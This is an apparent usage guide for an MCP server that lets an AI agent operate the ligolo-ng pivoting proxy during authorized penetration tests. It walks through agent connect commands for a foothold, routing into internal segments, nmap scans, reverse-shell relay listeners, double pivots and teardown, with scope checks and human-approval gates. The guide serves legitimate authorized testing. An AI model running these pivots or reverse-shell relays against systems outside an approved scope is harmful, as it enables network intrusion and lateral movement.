# Usage

Operational walkthrough for this MCP server: what to call, in what order, what
comes back, and what stays your job. Reference material lives in
[README.md](README.md); this file is the "run a pivot" path.

Assumes the server is installed (`npm install && npm run build`) and you have an
authorized engagement — an in-scope segment behind a foothold, and permission to
upload a binary to it. **Check the version-compatibility warning at the top of
the README first**: this tracks ligolo-ng proxy 0.9.x specifically.

Contents: [Before the first call](#before-the-first-call) · [Register the
server](#register-the-server) · [Walkthrough: one pivot](#walkthrough-one-pivot) ·
[Reverse shell through the pivot](#reverse-shell-through-the-pivot) ·
[Agent-localhost services](#agent-localhost-services) · [Double pivot](#double-pivot) ·
[Read-only mode](#read-only-mode) · [Logs and multiple
instances](#logs-and-multiple-instances) · [Teardown and cleanup](#teardown-and-cleanup) ·
[Running outside BITORIA](#running-outside-bitoria) ·
[Reading the responses](#reading-the-responses) · [Raw API by hand](#raw-api-by-hand)

## Before the first call

| Need | Why | Check |
|---|---|---|
| ligolo-ng release (proxy **and** agent) | the server drives the proxy, the agent runs on the foothold | `LIGOLO_NG_DIR=/opt/ligolo-ng` → `ls $LIGOLO_NG_DIR/{proxy,agent,agent.exe}` |
| TUN privileges on the operator host | the proxy creates the interface; the agent needs none | `sudo -v` then `ip tuntap add user $USER mode tun test0 && ip link del test0` |
| a workspace directory | the proxy writes its config, certs, log and pid file there | e.g. `~/.ligolo-workspace/` |
| a framework checkout with the lateral checkpoint | the three reachability-changing tools refuse to run without it | `ls <root>/scripts/common/scope_check.py` |
| an active assessment | the gate reads its `scope.yaml` | `pentest status <assessment>` or `cat <root>/state/assessment-scope.json` |

The server auto-detects the framework root by walking up from its working
directory; set `LIGOLO_BITORIA_ROOT` when it is somewhere else, and
`LIGOLO_ASSESSMENT` when the active-assessment marker is stale or you want a
specific engagement.

## Register the server

Claude Code / any `.mcp.json` client:

```json
{
  "mcpServers": {
    "ligolo": {
      "command": "node",
      "args": ["/home/you/AI/ligolo-ng-mcp/dist/index.js"],
      "env": {
        "LIGOLO_NG_DIR": "/opt/ligolo-ng",
        "LIGOLO_API": "http://127.0.0.1:8080",
        "LIGOLO_PROXY_CONFIG": "/home/you/.ligolo-workspace/ligolo-ng.yaml"
      }
    }
  }
}
```

Hermes (`.hermes/config.yaml` → `mcp_servers`) is the same block in YAML:

```yaml
ligolo:
  command: node
  args: ['/home/you/AI/ligolo-ng-mcp/dist/index.js']
  env:
    LIGOLO_NG_DIR: /opt/ligolo-ng
    LIGOLO_API: http://127.0.0.1:8080
    LIGOLO_PROXY_CONFIG: /home/you/.ligolo-workspace/ligolo-ng.yaml
```

Smoke-test it without a client (lists tools, call any of them):

```bash
npx @modelcontextprotocol/inspector node /home/you/AI/ligolo-ng-mcp/dist/index.js
```

The server logs one line to stderr at startup —
`ready — api=http://… assessment=<name>(env|marker) read_only=false tools=19 framework=/path`.
If `assessment=<unset>(none)`,
the read-only tools work and the three gated ones will refuse; that is the
expected state before you activate an engagement.

## Walkthrough: one pivot

Numbers in the examples are from a real run; yours will differ.

**1. Start the proxy.**

```json
{"tool": "ligolo_proxy_start", "arguments": {"port": "11601"}}
```

```json
{
  "running": true, "pid": 305436,
  "apiUrl": "http://127.0.0.1:8080",
  "binary": "/opt/ligolo-ng/linux/proxy",
  "configPath": "/home/you/.ligolo-workspace/ligolo-ng.yaml",
  "logPath": "/home/you/.ligolo-workspace/ligolo-proxy.log",
  "seeded": true,
  "fingerprint": "9F1FE20FF2CCEA6116A8542F44D64C9729F2D97AF71B15D16B7987F452D3AAD1",
  "fingerprint_error": null
}
```

`seeded: true` means it wrote a headless loopback-API config and (if you did not
set `LIGOLO_PASSWORD`) a generated credential in
`.ligolo-mcp-credentials` beside it. If a config already exists without
`web.enabled`/`web.users`, the call fails instead of rewriting it — re-call with
`{"rewriteConfig": true}` (original kept as `.bak`).

**2. Generate the agent command.**

```json
{"tool": "ligolo_agent_command", "arguments": {"proxyIp": "192.0.2.10"}}
```

```json
{"linux": "./agent -connect 192.0.2.10:11601 -accept-fingerprint 9F1F…3AAD1 -retry",
 "windows": "agent.exe -connect 192.0.2.10:11601 -accept-fingerprint 9F1F…3AAD1 -retry",
 "pinned": true, "warning": null}
```

The port is the proxy's configured listen port (including a `port` override from
step 1). Upload the matching agent binary to the foothold — **log the upload in
`state/cleanup-pending.md` the moment it lands** — and run that command.

**3. Confirm the agent and read its network.**

```json
{"tool": "ligolo_agents_list", "arguments": {}}
```

```json
{"count": 1, "agents": [{
  "agent_id": "1", "name": "svc@dmz01", "session_id": "000c29c6a099",
  "remote_addr": "10.0.5.12:51234", "tunnel_interface": "", "tunnel_running": false,
  "interfaces": [{"name": "eth0", "mtu": 1500, "addresses": ["10.0.5.12/24"]},
                 {"name": "eth1", "mtu": 1500, "addresses": ["172.16.5.9/24"]}]}]}
```

This is the `ifconfig` step: `eth1` with `172.16.5.9/24` is the segment behind
the foothold. Check it against `scope.yaml` **before** routing it.

**4. Try the pivot before approval — expect a refusal.**

```json
{"tool": "ligolo_tunnel_start",
 "arguments": {"agentId": "1", "tun": "ligolo", "target": "172.16.5.9"}}
```

```json
{"error": "checkpoint-denied", "tool": "ligolo_tunnel_start", "action_taken": false,
 "exit_code": 5,
 "message": "scope/checkpoint denied for 172.16.5.9 (exit 5). Record the pivot … then re-call with target + confirmed: true.\nscope_check: HOLD — …"}
```

Nothing reached the proxy. This is the checkpoint, not a bug: write the pivot
(foothold, destination, mechanism, ports) into `state/decisions.md`, get human
approval, then continue.

**5. Start the tunnel with the checkpoint cleared.**

```json
{"tool": "ligolo_tunnel_start",
 "arguments": {"agentId": "1", "tun": "ligolo", "target": "172.16.5.9", "confirmed": true}}
```

```json
{"scope_checked": true, "agent_id": "1", "agent_name": "svc@dmz01",
 "interface": "ligolo", "interface_created": true, "message": "tunnel starting",
 "routed": [{"Destination": "fe80::/64", "Active": true}]}
```

**6. Route the segment and prove it.**

```json
{"tool": "ligolo_route_add",
 "arguments": {"network": "172.16.5.0/24", "target": "172.16.5.9", "confirmed": true}}
```

```json
{"scope_checked": true, "network": "172.16.5.0/24", "interface": "ligolo",
 "message": "Routes [172.16.5.0/24] added."}
```

The `target` rule: a `/32` route derives it from the address; anything wider
needs an explicit in-scope host, because "the CIDR looked reachable" is not
authorization. Verify from the operator shell, not from the tool's word:

```bash
ip route get 172.16.5.9      # must name `dev ligolo`
nmap -sS -Pn -p 22,80,445 172.16.5.9
```

SYN and connect scans both work through the TUN — there is no SOCKS `-sT` tax.
Every newly reachable in-scope host goes into `state/hosts.md`.

**7. Confirm what is routed / listening.**

```json
{"tool": "ligolo_route_list", "arguments": {}}
{"tool": "ligolo_listener_list", "arguments": {}}
{"tool": "ligolo_interface_list", "arguments": {}}
```

## Reverse shell through the pivot

When the second-stage host can reach the foothold but not the operator, make the
foothold listen:

```json
{"tool": "ligolo_listener_add",
 "arguments": {"localAddress": "0.0.0.0:4444", "remoteAddress": "127.0.0.1:4443",
               "network": "tcp", "agentId": "1", "target": "10.0.5.12",
               "confirmed": true}}
```

```json
{"scope_checked": true, "message": "listener created",
 "listener": {"ListenerID": 0, "AgentID": 1, "Network": "tcp",
              "ListenerAddr": "0.0.0.0:4444", "RedirectAddr": "127.0.0.1:4443", "Online": true},
 "cleanup": "Record in state/cleanup-pending.md: listener 0.0.0.0:4444 -> 127.0.0.1:4443 (tcp) on agent 1; revert with ligolo_listener_delete {listenerId: 0, agentId: \"1\"}."}
```

Start the operator-side catcher on `4443` first, point the second-stage payload
at `<foothold>:4444`, then take the shell. `target` is the host the listener
makes reachable — here the foothold itself, which is already in scope.

The tool returns the cleanup line by design: a listener is a resident artifact
on a client host, and unrecorded ones outlive engagements.

## Agent-localhost services

Services bound to the *agent's* `127.0.0.1` are reachable through the magic CIDR
`240.0.0.0/4`: one address in it maps to the agent's loopback.

```json
{"tool": "ligolo_route_add",
 "arguments": {"network": "240.0.0.1/32", "target": "10.0.5.12", "confirmed": true}}
```

`target` is the foothold (that is whose loopback you are now reaching), not the
`240.x` address — the gate needs a host that is actually in `scope.yaml`.

```bash
curl -s http://240.0.0.1:8080/health
```

## Double pivot

Hop-1's session can relay the proxy's own listener to hop-2's segment, so hop-2's
agent never needs a route to the operator:

```json
{"tool": "ligolo_listener_add",
 "arguments": {"localAddress": "0.0.0.0:11601", "remoteAddress": "127.0.0.1:11601",
               "network": "tcp", "agentId": "1", "target": "10.0.5.12", "confirmed": true}}
```

Then run hop-2's agent against the foothold:

```bash
./agent -connect 172.16.5.9:11601 -accept-fingerprint <same proxy fingerprint>
```

A second agent appears in `ligolo_agents_list` with a new `agent_id`. Route its
segment onto its own interface so per-hop routes stay distinguishable:

```json
{"tool": "ligolo_tunnel_start", "arguments": {"agentId": "2", "tun": "ligolo2", "target": "10.9.9.9", "confirmed": true}}
{"tool": "ligolo_route_add", "arguments": {"network": "10.9.9.0/24", "interface": "ligolo2", "target": "10.9.9.9", "confirmed": true}}
```

**Each hop is its own checkpoint and its own `decisions.md` entry, and each hop's
relay listener is its own cleanup item.** Don't chain deeper than the objective
needs. Relay *chains* (agent-as-relay for downstream agents, beyond this
listener relay) are not implemented here.

## Read-only mode

Register with `LIGOLO_MCP_READ_ONLY=1` and the 10 mutating tools are never
exposed — only the 9 diagnostics. That is the right posture for recon inside a
segment you have not been cleared to route, and for a shared or demo session
where an accidental `tunnel_start` would be a real problem.

You can still pivot by hand: the endpoints in README §HTTP endpoints used do
exactly what the hidden tools would, minus the checkpoint — which means doing it
by hand is a deliberate act you must record yourself.

## Logs and multiple instances

The proxy log lands in the assessment's state tree, numbered per instance:

```
assessments/<name>/state/ligolo.log      # first instance
assessments/<name>/state/ligolo2.log     # second
assessments/<name>/state/ligolo3.log     # third
```

It is appended across restarts, so one file carries the whole engagement's
proxy history for that instance. `ligolo_proxy_start` returns the path it chose
(`logPath`), and it is worth recording that in `state/decisions.md` next to the
pivot — an assessor reading the folder later should not have to guess which log
belongs to which segment's proxy.

Without an active assessment there is no state tree, so the file falls back to
`<workspace>/ligolo[<n>].log`. Two other streams are not proxy logs: this
server's own diagnostics go to stderr (the MCP client captures them), and every
tool call is appended to `<assessment>/logs/commands.log`.

**A second proxy** is a normal thing to need — another engagement in the same
session, a port already taken, a segment that must not share routes. Just start
another one; the server allocates the instance name, both ports, the workspace
and the log:

```
ligolo_proxy_start                          → ligolo   api 127.0.0.1:8080  agent 0.0.0.0:11601
ligolo_proxy_start                          → ligolo2  api 127.0.0.1:8081  agent 0.0.0.0:11602
ligolo_proxy_start {"instance": "ligolo3"}  → ligolo3  api 127.0.0.1:8082  agent 0.0.0.0:11603
```

Each has its own `ligolo-ng.yaml`, selfcert cache (hence its own fingerprint —
run `ligolo_certificate_fingerprint {"instance": "ligolo2"}` before generating
that agent's command), credentials, pid and manifest entry. **Agent ids are
per-proxy**: the same agent is `"1"` on both proxies, so every follow-up call
must carry the instance it belongs to.

```json
{"tool": "ligolo_agents_list", "arguments": {"instance": "ligolo2"}}
{"tool": "ligolo_tunnel_start", "arguments": {"instance": "ligolo2", "agentId": "1",
                                               "tun": "ligolo2", "target": "10.9.9.9", "confirmed": true}}
```

Two habits that prevent the obvious mistakes: give each instance its own TUN
name (`ligolo`, `ligolo2`, …) so `ip route` output stays readable, and check
`ligolo_proxy_status` (no argument) before blaming a tool — it lists every live
instance, its API URL and its log, and flags proxies this server did not start
with `managed: false`.

## Teardown and cleanup

```json
{"tool": "ligolo_teardown",
 "arguments": {"agentId": "1", "interface": "ligolo", "deleteInterface": true}}
```

```json
{"scope_checked": false, "agent_id": "1",
 "steps": [{"step": "delete listener 0", "ok": true},
           {"step": "delete route 172.16.5.0/24", "ok": true},
           {"step": "stop tunnel", "ok": true},
           {"step": "delete interface ligolo", "ok": true}]}
```

Order matters and the tool enforces it: listeners, then routes, then the tunnel,
then the interface. Stopping the tunnel first tears down the TUN, after which
route deletion answers `no such process` — a route that is already gone is
reported as success, not as a failure.

What teardown does **not** do, and you must:

- delete the uploaded agent binary on the foothold (`rm`/`del` through your shell);
- kill the agent process if it is still running (the API cannot);
- resolve every `state/cleanup-pending.md` row for the pivot;
- record the teardown in `state/decisions.md` and flip the hosts in
  `state/hosts.md` to their post-pivot state;
- stop the proxy (`ligolo_proxy_stop`, per instance) when the engagement's
  pivoting is done, and optionally `sudo ip link del ligolo` if a stale
  interface is left behind. The log file stays in `state/` as evidence; do not
  delete it at teardown.

## Running outside BITORIA

The server does not require the framework, and this is a supported mode, not a
degraded one — proxy lifecycle, agents, interfaces, routes, listeners,
fingerprints and teardown all work. One env var carries the authorization:

```bash
export LIGOLO_SCOPE="10.10.10.0/24,172.16.5.9"   # hosts/CIDRs you may pivot to
```

`ligolo_tunnel_start` / `ligolo_route_add` / `ligolo_listener_add` then require
the target to be inside that list **and** `confirmed: true`:

```
target inside LIGOLO_SCOPE, no confirmed   → checkpoint-denied, exit 5
target outside LIGOLO_SCOPE                → checkpoint-denied, exit 3
neither LIGOLO_SCOPE nor an assessment     → checkpoint-denied, exit 4
```

What standalone mode does not give you: the assessment's `scope.yaml`
enforcement beyond `LIGOLO_SCOPE`, `state/decisions.md`, the `commands.log`
audit trail, and state-dir logs (they fall back to `<workspace>/ligolo[<n>].log`).
If you run assessments for real, use framework mode; `LIGOLO_SCOPE` is for
labs, CTFs, and one-off pivots.

There is no way to turn the gate off. If you find yourself wanting to, the
honest move is to write the target into `LIGOLO_SCOPE` and confirm — that
leaves a record of what you decided was authorized.

### Framework mode needs the assessment's opt-in

When a BITORIA assessment is active, `scope.yaml` must say

```yaml
ligolo:
  mcp: true
```

It is asked at assessment setup and is **off by default**, like the Burp MCP
block. Without it the mutating tools refuse (exit 4) — the console wrapper
(`scripts/pivoting/ligolo_console.sh`) is the path for an engagement that did not
opt in. Read-only tools never need it.

## Reading the responses

Every response is JSON. Failures are JSON too, with `isError: true`:

```json
{"error": "checkpoint-denied", "tool": "ligolo_tunnel_start", "message": "…", "action_taken": false, "exit_code": 5}
{"error": "failed", "tool": "ligolo_route_add", "message": "POST /api/v1/routes -> HTTP 500: interface ligolo not found"}
```

`checkpoint-denied` always means *nothing happened*. `failed` means the call was
attempted and the proxy (or the binary, or the filesystem) said no. That
distinction is the first thing to check before retrying anything.

Common follow-ups while running:

| Response | What to do |
|---|---|
| `checkpoint-denied` + `exit_code: 5` | record in `decisions.md`, get approval, re-call with `confirmed: true` |
| `checkpoint-denied` + `exit_code: 4` | activate an assessment or set `LIGOLO_ASSESSMENT` / `LIGOLO_BITORIA_ROOT` |
| `HTTP 401 (proxy API rejects the token …)` | credentials in `.ligolo-mcp-credentials` vs `web.users`; the header is the raw JWT, never `Bearer …` |
| `agent N not connected (known ids: …)` | agent died or reconnected under a new id — re-run `ligolo_agents_list` |
| `interface … not found` on a route | create the interface, or use `ligolo_tunnel_start`, which does it |

More failure modes, including version drift: README §Troubleshooting.

## Raw API by hand

Useful for debugging the MCP layer, scripting without an MCP client, or the
read-only-mode case above:

```bash
TOK=$(curl -s -X POST http://127.0.0.1:8080/api/auth \
  -H 'Content-Type: application/json' \
  -d "{\"username\":\"ligolo\",\"password\":\"$(jq -r .password < ~/.ligolo-workspace/.ligolo-mcp-credentials)\"}" \
  | jq -r .token)

curl -s -H "Authorization: $TOK" http://127.0.0.1:8080/api/v1/agents | jq
curl -s -X POST -H "Authorization: $TOK" -H 'Content-Type: application/json' \
  -d '{"Interface":"ligolo","Route":["172.16.5.0/24"]}' \
  http://127.0.0.1:8080/api/v1/routes
```

Endpoints, payloads and the tokens' 1h TTL: README §HTTP endpoints used.
